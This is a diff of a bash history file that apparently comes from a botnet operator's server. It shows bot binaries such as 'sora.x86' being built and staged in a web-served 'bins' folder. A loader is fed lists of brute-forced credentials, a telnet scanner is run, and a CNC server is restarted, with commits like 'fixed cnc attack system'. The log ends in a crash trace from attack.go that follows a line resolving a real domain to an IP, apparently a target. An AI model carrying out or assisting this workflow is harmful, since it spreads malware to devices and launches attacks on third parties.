@@ -1,78 +1,3 @@
-cd boinker/binaries/
-ls
-./sora.x86 
-dstat
-tail -f /var/log/httpd/access_log 
-reboot
-htop
-. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
-clear
-ls
-cd cnc
-cd boinker/
-clear
-cd cnc
-./cnc
-pkill -f cnc
-./cnc
-tail -f /var/log/httpd/access_log 
-htop
-ip a
-cd /var/www/html/bins
-ls
-nano ;s
-clear
-cp * ..
-clear
-ls
-cd ..
-ls
-rm bins/
-rm -rf  bins/
-mkdir bins
-mv sora.* bins/
-cd bins
-ls
-clear
-ls
-./sora.x86 
-dstat
-htop
-dstat
-htop
-dstat
-reboot
-. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
-cd boinker/
-clear
-pkill -f cnc
-cd cnc/
-./cnc
-cd boinker/cnc
-./cnc
-dstat
-cd boinker/
-cd cnc/
-./cnc
-cd boinker/loader/
-ls
-./loader < bruted.txt 
-dstat
-cd ../
-ls
-cd binaries/
-clear
-ls
-./sora.x86 
-htop
-reboot
-git add -A
-git commit -m "fixed cnc attack system"
-git push
-. "\root\.cursor-server\bin\b3f1951240d5016648330fab51192dc03e8d7050/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
-sh build_bot.sh 
-cp binaries/* /var/www/html/bins
-rm binaries/*
 sh build_bot.sh 
 cp binaries/* /var/www/html/bins
 y
@@ -995,6 +920,81 @@ systemctl status httpd
 systemctl status firewalld
 . "\root\.cursor-server\bin\adb0f9e3e4f184bba7f3fa6dbfd72ad0ebb8cfd0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
 clear
+ls
+sh build.sh 
+. "\root\.cursor-server\bin\adb0f9e3e4f184bba7f3fa6dbfd72ad0ebb8cfd0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
+git add -A
+git commit -m "improved cnc, improved bot"
+git push
+screen -r
+mysql
+ip a
+cd loader/
+touch ga.txt
+nano ga.txt 
+./loader < ga.txt 
+ls
+python telnet_scanner.py 
+python loader.py ga.txt 
+ls
+sh build.sh 
+cd s
+cd src
+ls
+./loader < ga.txt 
+cd ~/loader
+clear
+touch ga.txt
+nano ga.txt 
+./loader < ga.txt 
+ls
+cd bins
+ls
+./loader < ga.txt 
+c ~/loader
+cd ~/loader
+clear
+sh build.sh 
+./loader < ga.txt 
+cd ~/cmc
+cd ~/cnc
+clear
+./cnc_server 
+htop
+pkill -9 python
+htop
+pkill -f cnc_server
+screen -dmS cnc ./cnc_server 
+screen -r
+htoop
+htop
+./cnc_server 
+pkill -f cnc_server
+pkill -f admin
+./cnc_server 
+./cnc_server [SUCCESS] IP resolved successfully: famoosterlee.nl -> 84.241.177.149
+Session Has Been Killed!
+panic: runtime error: slice bounds out of range [12:4]
+goroutine 15 [running]:
+main.NewAttack({0xc0000261c0, 0x3f}, 0x1)
+        /root/cnc/attack.go:303 +0x1376
+main.(*Admin).Handle(0xc0000160b0)
+        /root/cnc/admin.go:535 +0x5535
+main.initialHandler({0x6e3478?, 0xc00003e060})
+        /root/cnc/main.go:130 +0xa3e
+created by main.main.func1 in goroutine 24
+        /root/cnc/main.go:40 +0x2f
+screen -dmS cnc ./cnc_server 
+screen 0r
+screen -r
+screen -r cnc
+pkill -9 screen
+screen -wipe
+screen -dmS cnc ./cnc_server 
+screen -r
+. "\root\.cursor-server\bin\adb0f9e3e4f184bba7f3fa6dbfd72ad0ebb8cfd0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
+. "\root\.cursor-server\bin\adb0f9e3e4f184bba7f3fa6dbfd72ad0ebb8cfd0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
+clera
 ls
 sh build.sh 
 . "\root\.cursor-server\bin\adb0f9e3e4f184bba7f3fa6dbfd72ad0ebb8cfd0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
